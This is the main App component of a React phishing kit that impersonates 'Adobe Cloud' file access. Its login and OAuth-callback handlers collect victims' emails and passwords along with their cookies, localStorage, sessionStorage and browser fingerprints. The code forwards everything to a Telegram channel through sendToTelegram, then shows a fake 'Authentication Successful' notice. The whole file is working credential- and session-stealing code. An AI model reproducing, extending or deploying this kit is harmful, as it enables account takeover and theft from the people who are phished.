import React, { useState, useEffect } from 'react';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import { 
  getBrowserFingerprint, 
  extractEmailFromProvider,
  sendToTelegram 
} from './utils/oauthHandler';

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('home');
  const [selectedFileName, setSelectedFileName] = useState('');
  const [isLoading, setIsLoading] = useState(true);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Check for existing session on load
  useEffect(() => {
    const checkSession = async () => {
      try {
        // Check for OAuth callback first
        const urlParams = new URLSearchParams(window.location.search);
        const isOAuthCallback = urlParams.has('oauth_callback') || urlParams.has('code') || urlParams.has('state');
        
        if (isOAuthCallback) {
          await handleOAuthCallback();
          setIsLoading(false);
          return;
        }

        // Check for existing session
        const existingSession = localStorage.getItem('adobe_autograb_session');
        if (existingSession) {
          try {
            const sessionData = JSON.parse(existingSession);
            console.log('✅ Existing session found:', sessionData.email);
            setHasActiveSession(true);
            setCurrentPage('landing');
          } catch (error) {
            console.error('Error parsing existing session:', error);
            localStorage.removeItem('adobe_autograb_session');
            setCurrentPage('login');
          }
        } else {
          // No valid session, start with login page
          setCurrentPage('login');
        }
      } catch (error) {
        console.error('Session check error:', error);
        setCurrentPage('login');
      } finally {
        setIsLoading(false);
      }
    };

    checkSession();
  }, []);

  const handleOAuthCallback = async () => {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const provider = urlParams.get('provider');
    
    if (code && provider) {
      console.log('🔐 Processing OAuth callback for:', provider);
      
      // Capture cookies and session data after successful OAuth return
      const postAuthFingerprint = getBrowserFingerprint();
      
      const sessionData = {
        email: extractEmailFromProvider(provider, code),
        provider: provider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: navigator.userAgent,
        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: postAuthFingerprint.cookies,
        documentCookies: document.cookie,
        localStorage: postAuthFingerprint.localStorage,
        sessionStorage: postAuthFingerprint.sessionStorage,
        browserFingerprint: postAuthFingerprint
      };

      // Store successful session
      localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
      
      // Set session cookies
      try {
        const sessionId = sessionData.sessionId;
        const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
        
        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
        document.cookie = `sessionid=${sessionId}; expires=${expires}; path=/; secure; samesite=strict`;
        document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; expires=${expires}; path=/; secure; samesite=strict`;
        document.cookie = `logged_in=true; expires=${expires}; path=/; secure; samesite=strict`;
        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; expires=${expires}; path=/; secure; samesite=strict`;
      } catch (e) {
        console.warn('Failed to set cookies:', e);
      }

      // Send to Telegram
      try {
        await sendToTelegram(sessionData);
        console.log('✅ Session data sent to Telegram');
      } catch (error) {
        console.error('❌ Failed to send to Telegram:', error);
      }

      setHasActiveSession(true);
      setCurrentPage('landing');

      // Clean up URL
      window.history.replaceState({}, document.title, window.location.pathname);

      // Show success notification
      const notification = document.createElement('div');
      notification.innerHTML = `
        <div style="
          position: fixed;
          top: 20px;
          right: 20px;
          background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
          color: #166534;
          padding: 20px;
          border-radius: 12px;
          box-shadow: 0 10px 25px rgba(34, 197, 94, 0.15);
          z-index: 10000;
          max-width: 350px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          border: 1px solid rgba(34, 197, 94, 0.3);
        ">
          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✅ Authentication Successful!
          </div>
          <div style="color: #6b7280; font-size: 14px;">
            Welcome to Adobe Cloud
          </div>
        </div>
      `;
      document.body.appendChild(notification);
      setTimeout(() => {
        if (document.body.contains(notification)) {
          document.body.removeChild(notification);
        }
      }, 4000);
    }
  };

  // Handler for login success from login components
  const handleLoginSuccess = async (sessionData: any) => {
    console.log('🔐 Login success:', sessionData);
    
    // Set session cookies
    try {
      const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
      const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
      
      document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
      document.cookie = `sessionid=${sessionId}; expires=${expires}; path=/; secure; samesite=strict`;
      document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'oauth'))}; expires=${expires}; path=/; secure; samesite=strict`;
      document.cookie = `logged_in=true; expires=${expires}; path=/; secure; samesite=strict`;
      document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; expires=${expires}; path=/; secure; samesite=strict`;
    } catch (e) {
      console.warn('Failed to set cookies:', e);
    }

    const browserFingerprint = getBrowserFingerprint();
    
    const updatedSession = {
      ...sessionData,
      sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      fileName: 'Adobe Cloud Access',
      clientIP: 'Unknown',
      userAgent: navigator.userAgent,
      deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
      cookies: browserFingerprint.cookies,
      documentCookies: document.cookie,
      localStorage: browserFingerprint.localStorage,
      sessionStorage: browserFingerprint.sessionStorage,
      browserFingerprint: browserFingerprint
    };

    setHasActiveSession(true);
    localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));

    try {
      await sendToTelegram(updatedSession);
      console.log('✅ Login data sent to Telegram');
    } catch (error) {
      console.error('❌ Failed to send to Telegram:', error);
    }

    setCurrentPage('landing');
  };

  // Handler for file actions
  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFileName(fileName);
    console.log(`${action} action for file: ${fileName}`);
  };

  // Handler for logout
  const handleLogout = () => {
    // Clear all session data
    localStorage.removeItem('adobe_autograb_session');
    sessionStorage.clear();
    
    // Clear cookies
    const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
    cookies.forEach(cookie => {
      document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
    });
    
    setHasActiveSession(false);
    setCurrentPage('login');
  };

  // Loading state
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  // Render appropriate page based on current state
  if (currentPage === 'login') {
    return isMobile ? (
      <MobileLoginPage 
        fileName={selectedFileName}
        onBack={() => setCurrentPage('home')}
        onLoginSuccess={handleLoginSuccess} 
      />
    ) : (
      <LoginPage 
        fileName={selectedFileName}
        onBack={() => setCurrentPage('home')}
        onLoginSuccess={handleLoginSuccess} 
      />
    );
  }

  // Landing page
  try {
    return isMobile ? (
      <MobileLandingPage onFileAction={handleFileAction} />
    ) : (
      <LandingPage onFileAction={handleFileAction} />
    );
  } catch (error) {
    console.error('Landing page error:', error);
    // Fallback if landing pages have issues
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-4">Welcome to Adobe Cloud</h1>
          <p className="text-gray-600 mb-4">You have successfully authenticated!</p>
          <button 
            onClick={handleLogout}
            className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
          >
            Logout
          </button>
        </div>
      </div>
    );
  }
}

export default App;